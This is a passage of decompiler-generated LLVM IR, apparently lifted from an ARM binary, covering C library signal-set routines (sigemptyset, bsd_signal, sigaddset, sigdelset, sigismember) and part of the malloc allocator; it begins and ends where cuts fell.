  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10850, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1086c = add i32 %tmp, 4
  %v3_1086c = inttoptr i32 %v2_1086c to i32*
  store i32 0, i32* %v3_1086c, align 4
  %v1_10870 = load i32, i32* %r3.global-to-local, align 4
  %v2_10870 = inttoptr i32 %v1_10870 to i32*
  store i32 0, i32* %v2_10870, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10878 = load i32, i32* @r4, align 4
  store i32 %v3_10878, i32* %stack_var_-16, align 4
  %v6_10878 = load i32, i32* @r5, align 4
  %v9_10878 = load i32, i32* @r6, align 4
  %v7_10880 = icmp eq i32 %arg2, -1
  br i1 %v7_10880, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_10888 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_108a4

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_108ac

dec_label_pc_108a4:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* @r6, align 4
  %v7_108a8 = icmp slt i32 %arg1, 65
  br i1 %v7_108a8, label %dec_label_pc_108c8, label %dec_label_pc_108ac

dec_label_pc_108ac:                               ; preds = %.thread16, %dec_label_pc_108a4
  %v0_108b0 = call i32 @__aeabi_read_tp()
  %v3_108b4 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_108b4 = sext i16 %v3_108b4 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_108c0 = add i32 %v4_108b4, %v0_108b0
  %v4_108c0 = inttoptr i32 %v3_108c0 to i32*
  store i32 22, i32* %v4_108c0, align 4
  %v0_10920.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_108c8:                               ; preds = %dec_label_pc_108a4
  %v2_108c8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_108c8, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_108d0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_108d0, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_108e0 = call i32 @__sigaddset()
  %v0_108e8 = load i32, i32* @r5, align 4
  store i32 %v0_108e8, i32* %r1.global-to-local, align 4
  %v0_108ec = load i32, i32* @r6, align 4
  %v2_108ec = add i32 %v0_108ec, 11780
  %v2_108f0 = call i32 @__GI___sigismember(i32 %v2_108ec, i32 %v0_108e8)
  store i32 %v2_108c8, i32* %r1.global-to-local, align 4
  %v0_10904 = load i32, i32* @r5, align 4
  %v3_10910 = call i32 @__libc_sigaction(i32 %v0_10904, i32 %v2_108c8, i32 %v2_10888)
  %v1_10914 = icmp slt i32 %v3_10910, 0
  br i1 %v1_10914, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_108c8
  %v5_10918 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_10918, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_108c8
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_108ac, %bb32
  %v0_10920 = phi i32 [ %v5_10918, %bb31 ], [ %v0_10920.pre, %dec_label_pc_108ac ], [ -1, %bb32 ]
  %v2_10928 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_10928, i32* @r4, align 4
  store i32 %v6_10878, i32* @r5, align 4
  store i32 %v9_10878, i32* @r6, align 4
  ret i32 %v0_10920

; uselistorder directives
  uselistorder i32 %v2_108c8, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_108ac, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1093c = add i32 %arg2, -1
  %v3_10940 = udiv i32 %v1_1093c, 32
  %v4_10944 = mul nuw nsw i32 %v3_10940, 4
  %v5_10944 = add i32 %v4_10944, %arg1
  %v6_10944 = inttoptr i32 %v5_10944 to i32*
  %v7_10944 = load i32, i32* %v6_10944, align 4
  %v1_10948 = urem i32 %v1_1093c, 32
  %v7_10950 = shl i32 1, %v1_10948
  %v8_10950 = and i32 %v7_10944, %v7_10950
  %v10_10950 = icmp ne i32 %v8_10950, 0
  %. = zext i1 %v10_10950 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_1093c, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_10960 = load i32, i32* @r1, align 4
  %v1_10960 = add i32 %v0_10960, -1
  %v3_10964 = udiv i32 %v1_10960, 32
  %v0_10968 = load i32, i32* @r0, align 4
  %v4_10968 = mul nuw nsw i32 %v3_10964, 4
  %v5_10968 = add i32 %v0_10968, %v4_10968
  %v6_10968 = inttoptr i32 %v5_10968 to i32*
  %v7_10968 = load i32, i32* %v6_10968, align 4
  %v1_1096c = urem i32 %v1_10960, 32
  %v7_10974 = shl i32 1, %v1_1096c
  %v8_10974 = or i32 %v7_10968, %v7_10974
  store i32 %v8_10974, i32* %v6_10968, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10960, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10984 = add i32 %arg2, -1
  %v3_10988 = udiv i32 %v1_10984, 32
  %v4_1098c = mul nuw nsw i32 %v3_10988, 4
  %v5_1098c = add i32 %v4_1098c, %arg1
  %v6_1098c = inttoptr i32 %v5_1098c to i32*
  %v7_1098c = load i32, i32* %v6_1098c, align 4
  %v1_10990 = urem i32 %v1_10984, 32
  %tmp = shl i32 -1, %v1_10990
  %v8_10998 = add i32 %tmp, -1
  %v9_10998 = and i32 %v7_1098c, %v8_10998
  store i32 %v9_10998, i32* %v6_1098c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10984, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_109a8 = udiv i32 %arg1, 256
  store i32 %v3_109a8, i32* %r1.global-to-local, align 4
  %v2_109ac = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_109ac, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_109b8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_109ac, i32 %v0_109b8)
  %v0_109bc = load i32, i32* %r1.global-to-local, align 4
  %v1_109bc = add i32 %v0_109bc, 1048320
  %v3_109c0 = udiv i32 %v1_109bc, 65536
  %v1_109c4 = and i32 %v3_109c0, 8
  %v6_109c8 = shl i32 %v0_109bc, %v1_109c4
  %v1_109cc = add i32 %v6_109c8, 520192
  %v3_109d0 = udiv i32 %v1_109cc, 65536
  %v1_109d4 = and i32 %v3_109d0, 4
  %v6_109d8 = shl i32 %v6_109c8, %v1_109d4
  %v1_109dc = add i32 %v6_109d8, 245760
  %v3_109e0 = udiv i32 %v1_109dc, 65536
  %v1_109e4 = and i32 %v3_109e0, 2
  %v6_109e8 = shl i32 %v6_109d8, %v1_109e4
  store i32 %v6_109e8, i32* %r1.global-to-local, align 4
  %v1_109ec = sub nsw i32 13, %v1_109c4
  %v2_109f0 = sub nsw i32 %v1_109ec, %v1_109d4
  %v3_109f4 = udiv i32 %v6_109e8, 32768
  %v4_109f4 = sub nuw nsw i32 -1, %v3_109f4
  %v4_109f8 = udiv i32 %v6_109e8, 16384
  %v5_109f8 = and i32 %v4_109f8, %v4_109f4
  %v2_109fc = sub nsw i32 %v2_109f0, %v1_109e4
  %v2_10a00 = add nsw i32 %v2_109fc, %v5_109f8
  %v1_10a04 = add nsw i32 %v2_10a00, 6
  %v0_10a08 = load i32, i32* %ip.global-to-local, align 4
  %v6_10a08 = lshr i32 %v0_10a08, %v1_10a04
  %v3_10a0c = mul nsw i32 %v2_10a00, 4
  %v1_10a10 = add nsw i32 %v3_10a0c, 32
  %v1_10a14 = urem i32 %v6_10a08, 4
  %v2_10a18 = or i32 %v1_10a14, %v1_10a10
  ret i32 %v2_10a18

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_10a20 = load i32, i32* @r4, align 4
  %v6_10a20 = load i32, i32* @r5, align 4
  %v9_10a20 = load i32, i32* @r6, align 4
  %v12_10a20 = load i32, i32* @r7, align 4
  %v15_10a20 = load i32, i32* @r8, align 4
  %v18_10a20 = load i32, i32* @sb, align 4
  %v21_10a20 = load i32, i32* @sl, align 4
  %v24_10a20 = load i32, i32* @fp, align 4
  %v27_10a20 = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r1.global-to-local, align 4
  %v4_10a34 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 108) to i32*), align 4
  store i32 %v4_10a34, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_10a40 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 68) to i32*), align 4
  store i32 %v4_10a40, i32* %r1.global-to-local, align 4
  %v0_10a44 = load i32, i32* @r0, align 4
  store i32 %v0_10a44, i32* @r5, align 4
  store i32 %v4_10a34, i32* %r2.global-to-local, align 4
  %v2_10a4c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10a4c, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %ip.global-to-local, align 4
  %v4_10a58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 112) to i32*), align 4
  store i32 %v4_10a58, i32* %ip.global-to-local, align 4
  store i32 68196, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_10a58)
  %v0_10a64 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10a64, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* @r1, align 4
  %v4_10a70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 16) to i32*), align 4
  store i32 %v4_10a70, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_10a7c.669 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10a70)
  %v0_10a7c = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_10a7c, -32
  br i1 %tmp, label %dec_label_pc_10aa0, label %dec_label_pc_10a84

dec_label_pc_10a84:                               ; preds = %entry
  store i32 66232, i32* %r2.global-to-local, align 4
  %v0_10a88 = call i32 @__aeabi_read_tp()
  store i32 %v0_10a88, i32* %r0.global-to-local, align 4
  %v3_10a8c = load i16, i16* @global_var_20d4c.598, align 2
  %v4_10a8c = sext i16 %v3_10a8c to i32
  store i32 %v4_10a8c, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_10a98 = add i32 %v4_10a8c, %v0_10a88
  %v4_10a98 = inttoptr i32 %v3_10a98 to i32*
  store i32 12, i32* %v4_10a98, align 4
  br label %dec_label_pc_11324

dec_label_pc_10aa0:                               ; preds = %entry
  %v1_10aa0 = add i32 %v0_10a7c, 11
  store i32 %v1_10aa0, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r2.global-to-local, align 4
  %v2_10aac = icmp ugt i32 %v1_10aa0, 14
  %v7_10aac = icmp eq i32 %v1_10aa0, 15
  %v2_10ab0 = xor i1 %v7_10aac, true
  %v3_10ab0 = and i1 %v2_10aac, %v2_10ab0
  br i1 %v3_10ab0, label %bb, label %bb141

bb:                                               ; preds = %dec_label_pc_10aa0
  %v5_10ab0 = and i32 %v1_10aa0, -8
  store i32 %v5_10ab0, i32* @sl, align 4
  br label %bb141

bb141:                                            ; preds = %dec_label_pc_10aa0, %bb
  %v4_10ab4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 64) to i32*), align 4
  store i32 %v4_10ab4, i32* @r0, align 4
  %v1_10ab8 = inttoptr i32 %v4_10ab4 to i32*
  %v2_10ab8 = load i32, i32* %v1_10ab8, align 4
  store i32 %v2_10ab8, i32* @r4, align 4
  %v2_10abc = xor i1 %v2_10aac, true
  %v3_10abc = or i1 %v7_10aac, %v2_10abc
  br i1 %v3_10abc, label %bb142, label %bb143

bb142:                                            ; preds = %bb141
  store i32 16, i32* @sl, align 4
  br label %bb143

bb143:                                            ; preds = %bb141, %bb142
  %v1_10ac0 = urem i32 %v2_10ab8, 2
  %v2_10ac0 = icmp eq i32 %v1_10ac0, 0
  br i1 %v2_10ac0, label %dec_label_pc_10ac8, label %dec_label_pc_10ad8

dec_label_pc_10ac8:                               ; preds = %bb143
  %v2_10ac8 = icmp eq i32 %v2_10ab8, 0
  br i1 %v2_10ac8, label %dec_label_pc_10ad0, label %dec_label_pc_10eb4

dec_label_pc_10ad0:                               ; preds = %dec_label_pc_10ac8
  %v0_10ad0 = call i32 @__malloc_consolidate()
  store i32 %v0_10ad0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10eb4

dec_label_pc_10ad8:                               ; preds = %bb143
  %v0_10ad8 = load i32, i32* @sl, align 4
  %tmp204 = icmp ugt i32 %v0_10ad8, %v2_10ab8
  br i1 %tmp204, label %dec_label_pc_10b00, label %dec_label_pc_10ae0

dec_label_pc_10ae0:                               ; preds = %dec_label_pc_10ad8
  %v1_10ae0 = add i32 %v4_10ab4, -4
  store i32 %v1_10ae0, i32* %r1.global-to-local, align 4
  %v3_10ae4 = udiv i32 %v0_10ad8, 8
  store i32 %v3_10ae4, i32* %r2.global-to-local, align 4
  %v4_10ae8 = mul nuw i32 %v3_10ae4, 4
  %v5_10ae8 = add i32 %v4_10ae8, %v1_10ae0
  %v6_10ae8 = inttoptr i32 %v5_10ae8 to i32*
  %v7_10ae8 = load i32, i32* %v6_10ae8, align 4
  store i32 %v7_10ae8, i32* %r0.global-to-local, align 4
  %v2_10aec = icmp eq i32 %v7_10ae8, 0
  br i1 %v2_10aec, label %dec_label_pc_10b00, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_10ae0
  %v2_10af0 = add i32 %v7_10ae8, 8
  %v3_10af0 = inttoptr i32 %v2_10af0 to i32*
  %v4_10af0 = load i32, i32* %v3_10af0, align 4
  store i32 %v4_10af0, i32* %r3.global-to-local, align 4
  store i32 %v2_10af0, i32* %r0.global-to-local, align 4
  store i32 %v2_10af0, i32* %r4.global-to-local, align 4
  store i32 %v4_10af0, i32* %v6_10ae8, align 4
  br label %dec_label_pc_11308

dec_label_pc_10b00:                               ; preds = %dec_label_pc_10ae0, %dec_label_pc_10ad8
  %tmp205 = icmp ugt i32 %v0_10ad8, 255
  br i1 %tmp205, label %dec_label_pc_10b50, label %dec_label_pc_10b08

dec_label_pc_10b08:                               ; preds = %dec_label_pc_10b00
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_10b10 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 64) to i32*), align 4
  %v3_10b14 = udiv i32 %v0_10ad8, 8
  store i32 %v3_10b14, i32* @r7, align 4
  %v4_10b18 = mul nuw i32 %v3_10b14, 8
  %v5_10b18 = add i32 %v4_10b10, %v4_10b18
  store i32 %v5_10b18, i32* %r3.global-to-local, align 4
  %v1_10b1c = add i32 %v5_10b18, 44
  store i32 %v1_10b1c, i32* %ip.global-to-local, align 4
  %v1_10b20 = add i32 %v5_10b18, 56
  %v2_10b20 = inttoptr i32 %v1_10b20 to i32*
  %v3_10b20 = load i32, i32* %v2_10b20, align 4
  store i32 %v3_10b20, i32* %r0.global-to-local, align 4
  %v9_10b24 = icmp eq i32 %v3_10b20, %v1_10b1c
  br i1 %v9_10b24, label %dec_label_pc_10cb0, label %dec_label_pc_10b2c

dec_label_pc_10b2c:                               ; preds = %dec_label_pc_10b08
  %v2_10b2c = add i32 %v3_10b20, %v0_10ad8
  store i32 %v2_10b2c, i32* %r3.global-to-local, align 4
  %v1_10b30 = add i32 %v2_10b2c, 4
  %v2_10b30 = inttoptr i32 %v1_10b30 to i32*
  %v3_10b30 = load i32, i32* %v2_10b30, align 4
  store i32 %v3_10b30, i32* %r2.global-to-local, align 4
  %v1_10b34 = add i32 %v3_10b20, 12
  %v2_10b34 = inttoptr i32 %v1_10b34 to i32*
  %v3_10b34 = load i32, i32* %v2_10b34, align 4
  store i32 %v3_10b34, i32* %r1.global-to-local, align 4
  %v1_10b38 = or i32 %v3_10b30, 1
  store i32 %v1_10b38, i32* %r2.global-to-local, align 4
  %v1_10b3c = add i32 %v3_10b20, 8
  store i32 %v1_10b3c, i32* %r4.global-to-local, align 4
  store i32 %v1_10b38, i32* %v2_10b30, align 4
  %v0_10b44 = load i32, i32* %ip.global-to-local, align 4
  %v1_10b44 = load i32, i32* %r1.global-to-local, align 4
  %v2_10b44 = add i32 %v1_10b44, 8
  %v3_10b44 = inttoptr i32 %v2_10b44 to i32*
  store i32 %v0_10b44, i32* %v3_10b44, align 4
  %v0_10b48 = load i32, i32* %r1.global-to-local, align 4
  %v1_10b48 = load i32, i32* %ip.global-to-local, align 4
  %v2_10b48 = add i32 %v1_10b48, 12
  %v3_10b48 = inttoptr i32 %v2_10b48 to i32*
  store i32 %v0_10b48, i32* %v3_10b48, align 4
  br label %dec_label_pc_11308

dec_label_pc_10b50:                               ; preds = %dec_label_pc_10b00
  store i32 %v0_10ad8, i32* %r0.global-to-local, align 4
  %v1_10b54 = call i32 @__malloc_largebin_index(i32 %v0_10ad8)
  store i32 %v1_10b54, i32* %r0.global-to-local, align 4
  %v0_10b58 = load i32, i32* @r4, align 4
  %v1_10b58 = and i32 %v0_10b58, 2
  %v2_10b58 = icmp eq i32 %v1_10b58, 0
  store i32 %v1_10b54, i32* @r7, align 4
  br i1 %v2_10b58, label %dec_label_pc_10cb0, label %dec_label_pc_10b64

dec_label_pc_10b64:                               ; preds = %dec_label_pc_10b50
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r1.global-to-local, align 4
  %v4_10b6c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 64) to i32*), align 4
  store i32 %v4_10b6c, i32* @r0, align 4
  %v0_10b70 = call i32 @__malloc_consolidate()
  store i32 %v0_10b70, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cb0

dec_label_pc_10b78:                               ; preds = %dec_label_pc_10cc4
  %v1_10b78 = add i32 %v3_10cc4, 4
  %v2_10b78 = inttoptr i32 %v1_10b78 to i32*
  %v3_10b78 = load i32, i32* %v2_10b78, align 4
  store i32 %v3_10b78, i32* %r3.global-to-local, align 4
  %v0_10b7c = load i32, i32* @sl, align 4
  %v1_10b80 = and i32 %v3_10b78, -4
  store i32 %v1_10b80, i32* %r4.global-to-local, align 4
  %v1_10b84 = add i32 %v3_10cc4, 12
  %v2_10b84 = inttoptr i32 %v1_10b84 to i32*
  %v3_10b84 = load i32, i32* %v2_10b84, align 4
  store i32 %v3_10b84, i32* %ip.global-to-local, align 4
  %tmp206 = icmp ugt i32 %v0_10b7c, 255
  br i1 %tmp206, label %dec_label_pc_10be0, label %dec_label_pc_10b8c

dec_label_pc_10b8c:                               ; preds = %dec_label_pc_10b78
  %v9_10b8c = icmp eq i32 %v3_10b84, %v0_10be4
  br i1 %v9_10b8c, label %dec_label_pc_10b94, label %dec_label_pc_10be0

dec_label_pc_10b94:                               ; preds = %dec_label_pc_10b8c
  %v0_10b94 = load i32, i32* @sb, align 4
  %v1_10b94 = add i32 %v0_10b94, 48
  %v2_10b94 = inttoptr i32 %v1_10b94 to i32*
  %v3_10b94 = load i32, i32* %v2_10b94, align 4
  store i32 %v3_10b94, i32* %r3.global-to-local, align 4
  %v9_10b98 = icmp eq i32 %v3_10cc4, %v3_10b94
  br i1 %v9_10b98, label %dec_label_pc_10ba0, label %dec_label_pc_10be0

dec_label_pc_10ba0:                               ; preds = %dec_label_pc_10b94
  %v1_10ba0 = load i32, i32* @fp, align 4
  %tmp207 = icmp ugt i32 %v1_10b80, %v1_10ba0
  br i1 %tmp207, label %dec_label_pc_10ba8, label %dec_label_pc_10be0

dec_label_pc_10ba8:                               ; preds = %dec_label_pc_10ba0
  %v2_10ba8 = sub i32 %v1_10b80, %v0_10b7c
  store i32 %v2_10ba8, i32* %r2.global-to-local, align 4
  %v2_10bac = add i32 %v0_10b7c, %v3_10cc4
  store i32 %v2_10bac, i32* %r3.global-to-local, align 4
  %v1_10bb0 = or i32 %v0_10b7c, 1
  store i32 %v1_10bb0, i32* %r0.global-to-local, align 4
  %v1_10bb4 = or i32 %v2_10ba8, 1
  store i32 %v1_10bb4, i32* %r1.global-to-local, align 4
  %v1_10bb8 = add i32 %v3_10cc4, 8
  store i32 %v1_10bb8, i32* %r4.global-to-local, align 4
  %v2_10bbc = add i32 %v0_10be4, 8
  %v3_10bbc = inttoptr i32 %v2_10bbc to i32*
  store i32 %v2_10bac, i32* %v3_10bbc, align 4
  %v0_10bc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_10bc0 = load i32, i32* %ip.global-to-local, align 4
  %v2_10bc0 = add i32 %v1_10bc0, 12
  %v3_10bc0 = inttoptr i32 %v2_10bc0 to i32*
  store i32 %v0_10bc0, i32* %v3_10bc0, align 4
  %v0_10bc4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10bc4 = load i32, i32* @r6, align 4
  %v2_10bc4 = add i32 %v1_10bc4, 4
  %v3_10bc4 = inttoptr i32 %v2_10bc4 to i32*
  store i32 %v0_10bc4, i32* %v3_10bc4, align 4
  %v0_10bc8 = load i32, i32* %r3.global-to-local, align 4
  %v1_10bc8 = load i32, i32* @sb, align 4
  %v2_10bc8 = add i32 %v1_10bc8, 48
  %v3_10bc8 = inttoptr i32 %v2_10bc8 to i32*
  store i32 %v0_10bc8, i32* %v3_10bc8, align 4
  %v0_10bcc = load i32, i32* %r2.global-to-local, align 4
  %v1_10bcc = load i32, i32* %r3.global-to-local, align 4
  %v3_10bcc = add i32 %v1_10bcc, %v0_10bcc
  %v4_10bcc = inttoptr i32 %v3_10bcc to i32*
  store i32 %v0_10bcc, i32* %v4_10bcc, align 4
  %v0_10bd0 = load i32, i32* %r1.global-to-local, align 4
  %v1_10bd0 = load i32, i32* %r3.global-to-local, align 4
  %v2_10bd0 = add i32 %v1_10bd0, 4
  %v3_10bd0 = inttoptr i32 %v2_10bd0 to i32*
  store i32 %v0_10bd0, i32* %v3_10bd0, align 4
  %v0_10bd4 = load i32, i32* %ip.global-to-local, align 4
  %v1_10bd4 = load i32, i32* %r3.global-to-local, align 4
  %v2_10bd4 = add i32 %v1_10bd4, 12
  %v3_10bd4 = inttoptr i32 %v2_10bd4 to i32*
  store i32 %v0_10bd4, i32* %v3_10bd4, align 4
  %v0_10bd8 = load i32, i32* %ip.global-to-local, align 4
  %v1_10bd8 = load i32, i32* %r3.global-to-local, align 4
  %v2_10bd8 = add i32 %v1_10bd8, 8
  %v3_10bd8 = inttoptr i32 %v2_10bd8 to i32*
  store i32 %v0_10bd8, i32* %v3_10bd8, align 4
  br label %dec_label_pc_11308

dec_label_pc_10be0:                               ; preds = %dec_label_pc_10ba0, %dec_label_pc_10b94, %dec_label_pc_10b8c, %dec_label_pc_10b78
  %v9_10be0 = icmp eq i32 %v1_10b80, %v0_10b7c
  %v2_10be4 = add i32 %v3_10b84, 8
  %v3_10be4 = inttoptr i32 %v2_10be4 to i32*
  store i32 %v0_10be4, i32* %v3_10be4, align 4
  %v0_10be8 = load i32, i32* %ip.global-to-local, align 4
  %v1_10be8 = load i32, i32* %r5.global-to-local, align 4
  %v2_10be8 = add i32 %v1_10be8, 12
  %v3_10be8 = inttoptr i32 %v2_10be8 to i32*
  store i32 %v0_10be8, i32* %v3_10be8, align 4
  br i1 %v9_10be0, label %dec_label_pc_10d40.loopexit, label %dec_label_pc_10bfc

dec_label_pc_10bfc:                               ; preds = %dec_label_pc_10be0
  %v0_10bfc = load i32, i32* %r4.global-to-local, align 4
  %tmp208 = icmp ugt i32 %v0_10bfc, 255
  br i1 %tmp208, label %dec_label_pc_10c20, label %dec_label_pc_10c04

dec_label_pc_10c04:                               ; preds = %dec_label_pc_10bfc
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r2.global-to-local, align 4
  %v1_10c08 = load i32, i32* %r8.global-to-local, align 4
  %v2_10c08 = add i32 %v1_10c08, ptrtoint (i32* @global_var_20cf4.602 to i32)
  %v3_10c08 = inttoptr i32 %v2_10c08 to i32*
  %v4_10c08 = load i32, i32* %v3_10c08, align 4
  %v3_10c0c = udiv i32 %v0_10bfc, 8
  store i32 %v3_10c0c, i32* %r0.global-to-local, align 4
  %v4_10c10 = mul nuw i32 %v3_10c0c, 8
  %v5_10c10 = add i32 %v4_10c08, %v4_10c10
  store i32 %v5_10c10, i32* %r3.global-to-local, align 4
  %v1_10c14 = add i32 %v5_10c10, 44
  store i32 %v1_10c14, i32* %ip.global-to-local, align 4
  %v1_10c18 = add i32 %v5_10c10, 52
  %v2_10c18 = inttoptr i32 %v1_10c18 to i32*
  %v3_10c18 = load i32, i32* %v2_10c18, align 4
  store i32 %v3_10c18, i32* @lr, align 4
  br label %dec_label_pc_10c78

dec_label_pc_10c20:                               ; preds = %dec_label_pc_10bfc
  store i32 %v0_10bfc, i32* %r0.global-to-local, align 4
  %v1_10c24 = call i32 @__malloc_largebin_index(i32 %v0_10bfc)
  store i32 %v1_10c24, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %ip.global-to-local, align 4
  %v1_10c2c = load i32, i32* %r8.global-to-local, align 4
  %v2_10c2c = add i32 %v1_10c2c, ptrtoint (i32* @global_var_20cf4.602 to i32)
  %v3_10c2c = inttoptr i32 %v2_10c2c to i32*
  %v4_10c2c = load i32, i32* %v3_10c2c, align 4
  %v4_10c30 = mul i32 %v1_10c24, 8
  %v5_10c30 = add i32 %v4_10c2c, %v4_10c30
  store i32 %v5_10c30, i32* %r3.global-to-local, align 4
  %v1_10c34 = add i32 %v5_10c30, 44
  store i32 %v1_10c34, i32* %ip.global-to-local, align 4
  %v1_10c38 = add i32 %v5_10c30, 52
  %v2_10c38 = inttoptr i32 %v1_10c38 to i32*
  %v3_10c38 = load i32, i32* %v2_10c38, align 4
  store i32 %v3_10c38, i32* @lr, align 4
  %v9_10c3c = icmp eq i32 %v3_10c38, %v1_10c34
  br i1 %v9_10c3c, label %dec_label_pc_10c78, label %dec_label_pc_10c44

dec_label_pc_10c44:                               ; preds = %dec_label_pc_10c20
  %v1_10c44 = add i32 %v5_10c30, 56
  %v2_10c44 = inttoptr i32 %v1_10c44 to i32*
  %v3_10c44 = load i32, i32* %v2_10c44, align 4
  store i32 %v3_10c44, i32* %r1.global-to-local, align 4
  %v1_10c48 = add i32 %v3_10c44, 4
  %v2_10c48 = inttoptr i32 %v1_10c48 to i32*
  %v3_10c48 = load i32, i32* %v2_10c48, align 4
  store i32 %v3_10c48, i32* %r3.global-to-local, align 4
  %v0_10c4c = load i32, i32* %r4.global-to-local, align 4
  %v3_10c4c = icmp ult i32 %v0_10c4c, %v3_10c48
  br i1 %v3_10c4c, label %.thread, label %dec_label_pc_10c68.preheader

.thread:                                          ; preds = %dec_label_pc_10c44
  store i32 %v1_10c34, i32* @lr, align 4
  store i32 %v3_10c44, i32* %ip.global-to-local, align 4
